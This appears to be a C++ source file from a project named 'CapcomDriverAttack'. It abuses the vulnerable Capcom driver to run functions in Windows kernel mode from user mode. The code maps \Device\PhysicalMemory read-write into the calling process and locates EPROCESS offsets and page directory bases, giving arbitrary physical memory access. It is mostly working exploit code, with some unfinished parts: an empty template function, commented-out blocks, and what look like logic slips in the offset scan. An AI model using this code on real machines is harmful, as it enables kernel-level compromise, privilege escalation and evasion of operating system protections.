#include <windows.h>
#include <winternl.h>
#include <inttypes.h>
#include <iostream>
#include "../CapcomDriverAttack/CapcomWrapper.h"

using namespace std;

#define STATUS_SUCCESS 0
#define NtCurrentProcess()(HANDLE(-1))

typedef LARGE_INTEGER PHYSICAL_ADDRESS, *PPHYSICAL_ADDRESS;
typedef struct _PHYSICAL_MEMORY_RANGE {
	PHYSICAL_ADDRESS BaseAddress;
	LARGE_INTEGER NumberOfBytes;
} PHYSICAL_MEMORY_RANGE, *PPHYSICAL_MEMORY_RANGE;

typedef enum _SECTION_INHERIT {
    ViewShare = 1,
    ViewUnmap = 2
} SECTION_INHERIT;

PVOID physicalMemoryBegin = NULL;
SIZE_T physicalMemorySize;

uint64_t currentEProcess;
uint64_t currentDirectoryBase;
uint64_t targetDirectoryBase;

uint64_t uniqueProcessIdOffset;
uint64_t activeProcessLinksOffset;
uint64_t directoryTableBaseOffset;

/** Windows Kernel Function pointers **/
PVOID(NTAPI* ExAllocatePool)(unsigned __int64 poolType, SIZE_T numberOfBytes);
uint64_t(NTAPI* PsGetCurrentProcess)(void);
uint64_t(NTAPI* PsGetProcessId)(uint64_t pEProcess);
PPHYSICAL_MEMORY_RANGE(NTAPI* MmGetPhysicalMemoryRanges)(void);
uint64_t(NTAPI* ZwOpenSection)(PHANDLE sectionHandle, ACCESS_MASK desiredAccess, POBJECT_ATTRIBUTES objectAttributes);
uint64_t(NTAPI* ZwMapViewOfSection)(HANDLE, HANDLE, PVOID, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, SECTION_INHERIT, ULONG, ULONG);
NTSTATUS(NTAPI* ZwClose)(HANDLE);

/** Functions executed in kernel mode **/
void __stdcall InitKernelFunctions(MmGetSystemRoutineAddress_t pMmGetSystemRoutineAddress, PVOID userData) {
    ExAllocatePool = (decltype(ExAllocatePool))GetKernelRoutine(pMmGetSystemRoutineAddress, L"ExAllocatePool");
    PsGetCurrentProcess = (decltype(PsGetCurrentProcess))GetKernelRoutine(pMmGetSystemRoutineAddress, L"PsGetCurrentProcess");
    PsGetProcessId = (decltype(PsGetProcessId))GetKernelRoutine(pMmGetSystemRoutineAddress, L"PsGetProcessId");
    MmGetPhysicalMemoryRanges = (decltype(MmGetPhysicalMemoryRanges))GetKernelRoutine(pMmGetSystemRoutineAddress, L"MmGetPhysicalMemoryRanges");
    ZwOpenSection = (decltype(ZwOpenSection))GetKernelRoutine(pMmGetSystemRoutineAddress, L"ZwOpenSection");
    ZwMapViewOfSection = (decltype(ZwMapViewOfSection))GetKernelRoutine(pMmGetSystemRoutineAddress, L"ZwMapViewOfSection");
    ZwClose = (decltype(ZwClose))GetKernelRoutine(pMmGetSystemRoutineAddress, L"ZwClose");
}

void __stdcall GetEProcessOffsets(MmGetSystemRoutineAddress_t pMmGetSystemRoutineAddress, PVOID userData) {
    currentEProcess = PsGetCurrentProcess();
    currentDirectoryBase = __readcr3();
    uint64_t pid = PsGetProcessId(currentEProcess);
    uint32_t pidOffset = *(uint32_t*)((PUCHAR)PsGetProcessId + 3);
    if (pidOffset < 0x400 && *(uint64_t*)(currentEProcess + pidOffset) == pid) {
        uniqueProcessIdOffset = pidOffset;
        activeProcessLinksOffset = uniqueProcessIdOffset + 0x8;
    }

    for (int i = 0; i < 0x400; i += 0x8) {
        uint64_t* ptr = (uint64_t*)(currentEProcess + i);
        if (!uniqueProcessIdOffset && ptr[0] & 0xFFFFFFFF == pid && (ptr[1] > 0xffff800000000000) && (ptr[2] > 0xffff800000000000) && ((ptr[1] & 0xF) == (ptr[2] & 0xF))) {
            uniqueProcessIdOffset = i;
            activeProcessLinksOffset = uniqueProcessIdOffset + 0x8;
        } else if (directoryTableBaseOffset && ptr[0] == __readcr3()) {
            directoryTableBaseOffset = i;
        }
    }
}

void __stdcall GetCurrentEProcess(MmGetSystemRoutineAddress_t pMmGetSystemRoutineAddress, PVOID userData) {
    *(uint64_t*)userData = PsGetCurrentProcess();
}

void __stdcall GetProcessId(MmGetSystemRoutineAddress_t pMmGetSystemRoutineAddress, PVOID userData) {
    *(uint64_t*)userData = PsGetProcessId(*(uint64_t*)userData);
}

template<typename T = fnFreeCall>
T GetProcAddress( const char* Proc ) {

}

void __stdcall GetPhysicalMemoryData(MmGetSystemRoutineAddress_t pMmGetSystemRoutineAddress, PVOID userData) {
    wchar_t physicalMemoryName[] = L"\\Device\\PhysicalMemory";
	OBJECT_ATTRIBUTES physicalMemoryAttributes;
	UNICODE_STRING physicalMemoryNameUnicode;
    physicalMemoryNameUnicode.Buffer = physicalMemoryName;
	physicalMemoryNameUnicode.Length = sizeof(physicalMemoryName) - 2;
	physicalMemoryNameUnicode.MaximumLength = sizeof(physicalMemoryName);

	physicalMemoryAttributes.Length = sizeof(physicalMemoryAttributes);
	physicalMemoryAttributes.Attributes = OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE;
	physicalMemoryAttributes.ObjectName = &physicalMemoryNameUnicode;
	physicalMemoryAttributes.RootDirectory = 0;
	physicalMemoryAttributes.SecurityDescriptor = 0;
	physicalMemoryAttributes.SecurityQualityOfService = 0;

    PPHYSICAL_MEMORY_RANGE range = MmGetPhysicalMemoryRanges();
    while (range->NumberOfBytes.QuadPart) {
        physicalMemorySize = max(physicalMemorySize, range->BaseAddress.QuadPart + range->NumberOfBytes.QuadPart);
        range++;
    }

    HANDLE physicalMemoryHandle = 0;
    NTSTATUS status = ZwOpenSection(&physicalMemoryHandle, uint64_t(SECTION_ALL_ACCESS), &physicalMemoryAttributes);
    // auto k_ZwMapViewOfSection = GetKernelRoutine(pMmGetSystemRoutineAddress, L"ZwMapViewOfSection");
    if (status == STATUS_SUCCESS) {
        status = ZwMapViewOfSection(
            physicalMemoryHandle, 
            NtCurrentProcess(), 
            &physicalMemoryBegin, 
            0, 
            0, 
            0, 
            &physicalMemorySize, 
            ViewShare,
            // ViewShare, 
            0, 
            PAGE_READWRITE
        );

        // currentEProcess = PsGetCurrentProcess();
        // currentDirectoryBase = __readcr3();
        // uint64_t pid = PsGetProcessId(currentEProcess);
        // uint32_t pidOffset = *(uint32_t*)((PUCHAR)PsGetProcessId + 3);
        // if (pidOffset < 0x400 && *(uint64_t*)(currentEProcess + pidOffset) == pid) {
        //     uniqueProcessIdOffset = pidOffset;
        //     activeProcessLinksOffset = uniqueProcessIdOffset + 0x8;
        // }

        // for (int i = 0; i < 0x400; i += 0x8) {
        //     uint64_t* ptr = (uint64_t*)(currentEProcess + i);
        //     if (!uniqueProcessIdOffset && ptr[0] & 0xFFFFFFFF == pid && (ptr[1] > 0xffff800000000000) && (ptr[2] > 0xffff800000000000) && ((ptr[1] & 0xF) == (ptr[2] & 0xF))) {
        //         uniqueProcessIdOffset = i;
        //         activeProcessLinksOffset = uniqueProcessIdOffset + 0x8;
        //     } else if (directoryTableBaseOffset && ptr[0] == __readcr3()) {
        //         directoryTableBaseOffset = i;
        //     }
        // }

        
    }
    // ZwClose(physicalMemoryHandle);
    // *(NTSTATUS*)userData = status;
}



/** Usermode API functions **/
uint64_t GetCurrentEProcess() {
    uint64_t buf = 0;
    RunInKernel(GetCurrentEProcess, &buf);
    return buf;
}

uint64_t GetProcessId(uint64_t pEProcess) {
    RunInKernel(GetProcessId, &pEProcess);
    return pEProcess;
}



BOOL InitMemoryController() {
    if (!InitDriver()) {
        return FALSE;
    }
    RunInKernel(InitKernelFunctions, NULL);
    NTSTATUS status;
    RunInKernel(GetPhysicalMemoryData, &status);
    cout << status << endl;
    printf("physicalMemoryBegin: %16llx\n", (uint64_t)physicalMemoryBegin);
    printf("physicalMemorySize:  %16llx\n", physicalMemorySize);
    RunInKernel(GetEProcessOffsets, NULL);
    if (!uniqueProcessIdOffset || !activeProcessLinksOffset) {
        return FALSE;
    }
    targetDirectoryBase = currentDirectoryBase;
    return TRUE;
}

